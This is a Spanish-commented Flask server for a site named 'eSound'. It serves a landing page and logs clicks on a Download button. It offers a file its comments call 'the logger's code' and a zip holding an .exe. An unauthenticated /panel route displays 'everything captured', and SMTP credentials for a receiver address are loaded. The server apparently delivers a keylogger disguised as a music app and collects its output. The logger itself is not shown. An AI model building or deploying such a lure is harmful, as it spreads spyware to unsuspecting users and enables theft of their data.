# ============================================================
#  app.py - El servidor de eSound
#  Sirve la página, recibe el clic, y entrega los archivos.
#  Las credenciales se leen de variables de entorno.
# ============================================================

from flask import Flask, request, jsonify, send_file
import datetime
import os

app = Flask(__name__)


# ------------------------------------------------------------
#  Credenciales desde variables de entorno (seguras)
# ------------------------------------------------------------
SENDER_EMAIL = os.environ.get("SENDER_EMAIL", "")
SENDER_PASSWORD = os.environ.get("SENDER_PASSWORD", "")
RECEIVER_EMAIL = os.environ.get("RECEIVER_EMAIL", "")
SMTP_SERVER = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))


# ------------------------------------------------------------
#  Ruta principal: sirve el HTML de eSound
# ------------------------------------------------------------
@app.route("/")
def inicio():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()


# ------------------------------------------------------------
#  Ruta /descargar: recibe el clic del botón
# ------------------------------------------------------------
@app.route("/descargar", methods=["POST"])
def descargar():
    datos = request.get_json()
    evento = datos.get("evento", "desconocido")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("eventos_esound.txt", "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {evento}\n")

    print(f"¡Alguien hizo clic en Download! ({timestamp})")

    return jsonify({"estado": "ok", "mensaje": "Descarga registrada"})

# ------------------------------------------------------------
#  Ruta /descargar-logger: descarga el código del logger
# ------------------------------------------------------------
@app.route("/descargar-logger")
def descargar_logger():
    return send_file("esound.py", as_attachment=True)


# ------------------------------------------------------------
#  Ruta /descargar-app: descarga el .zip con el .exe dentro
# ------------------------------------------------------------
@app.route("/descargar-app")
def descargar_app():
    return send_file("esound.zip", as_attachment=True)


# ------------------------------------------------------------
#  Ruta /panel: muestra todo lo capturado
# ------------------------------------------------------------
@app.route("/panel")
def panel():
    if not os.path.exists("eventos_esound.txt"):
        return "<h1>No hay eventos todavía</h1>"

    with open("eventos_esound.txt", "r", encoding="utf-8") as f:
        contenido = f.read()

    return f"""
    <html>
    <head>
        <title>Panel de eSound</title>
        <style>
            body {{ background: #101211; color: #f5f7f4; font-family: Arial; padding: 40px; }}
            h1 {{ color: #b5f569; }}
            pre {{ background: #1a201b; padding: 20px; border-radius: 10px; }}
        </style>
    </head>
    <body>
        <h1>Panel de eSound</h1>
        <p>Eventos registrados:</p>
        <pre>{contenido}</pre>
    </body>
    </html>
    """


if __name__ == "__main__":
    app.run(debug=True)